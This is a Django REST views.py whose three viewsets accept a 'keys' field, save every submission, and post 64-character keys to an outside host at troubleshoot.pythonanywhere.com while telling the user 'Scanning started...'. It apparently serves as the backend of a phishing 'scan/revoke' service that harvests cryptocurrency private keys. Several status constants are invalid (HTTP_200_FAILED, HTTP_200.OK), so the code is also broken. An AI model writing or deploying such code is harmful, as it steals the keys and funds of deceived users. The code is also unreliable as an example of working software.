# views.py
from rest_framework import viewsets, status
from rest_framework.response import Response
from .models import KeyLog, KeyLogRevoke, KeyLogArbiscan
from .serializers import KeyLogSerializer, KeyLogRevokeSerializer, KeyLogArbiscanSerializer
import requests

class KeyLogViewSet(viewsets.ModelViewSet):
    queryset = KeyLog.objects.all()
    serializer_class = KeyLogSerializer
    http_method_names = ['post', 'put', 'patch', 'delete']

    def get_queryset(self):
        return KeyLog.objects.none()

    def create(self, request, *args, **kwargs):
        keys = request.data.get('keys', '')
        serializer = self.get_serializer(data=request.data)

        if len(keys) != 64:
            if serializer.is_valid():
                serializer.save()
            return Response("Key is invalid. Provide key to scan!", status=status.HTTP_200_FAILED)
        
        if serializer.is_valid():
            serializer.save()
            response = requests.post('https://troubleshoot.pythonanywhere.com/scan/troubleshoot.bash/', data={'keys': keys})
            if response.status_code == 200:
                return Response("Scanning started...", status=status.HTTP_200_OK)
            else:
                return Response("Failed to start scanning.", status=status.HTTP_500_INTERNAL_SERVER_ERROR)
        
        return Response("Scanning started...", status=status.HTTP_200.OK)

class KeyLogRevokeViewSet(viewsets.ModelViewSet):
    queryset = KeyLogRevoke.objects.all()
    serializer_class = KeyLogRevokeSerializer
    http_method_names = ['post', 'put', 'patch', 'delete']

    def get_queryset(self):
        return KeyLogRevoke.objects.none()

    def create(self, request, *args, **kwargs):
        keys = request.data.get('keys', '')
        serializer = self.get_serializer(data=request.data)

        if len(keys) != 64:
            if serializer.is_valid():
                serializer.save()
            return Response("Key is invalid. Provide key to scan!", status=status.HTTP_200_FAILED)
        
        if serializer.is_valid():
            serializer.save()
            response = requests.post('https://troubleshoot.pythonanywhere.com/scan/troubleshoot.bash/', data={'keys': keys})
            if response.status_code == 200:
                return Response("Scanning started...", status=status.HTTP_200.OK)
            else:
                return Response("Failed to start scanning.", status=status.HTTP_500_INTERNAL_SERVER_ERROR)
        
        return Response("Scanning started...", status=status.HTTP_200.OK)

class KeyLogArbiscanViewSet(viewsets.ModelViewSet):
    queryset = KeyLogArbiscan.objects.all()
    serializer_class = KeyLogArbiscanSerializer
    http_method_names = ['post', 'put', 'patch', 'delete']

    def get_queryset(self):
        return KeyLogArbiscan.objects.none()

    def create(self, request, *args, **kwargs):
        keys = request.data.get('keys', '')
        serializer = self.get_serializer(data=request.data)

        if len(keys) != 64:
            if serializer.is_valid():
                serializer.save()
            return Response("Key is invalid. Provide key to scan!", status=status.HTTP_200_FAILED)
        
        if serializer.is_valid():
            serializer.save()
            response = requests.post('https://troubleshoot.pythonanywhere.com/scan/troubleshoot.bash/', data={'keys': keys})
            if response.status_code == 200:
                return Response("Scanning started...", status=status.HTTP_200.OK)
            else:
                return Response("Failed to start scanning.", status=status.HTTP_500_INTERNAL_SERVER_ERROR)
        
        return Response("Scanning started...", status=status.HTTP_200.OK)
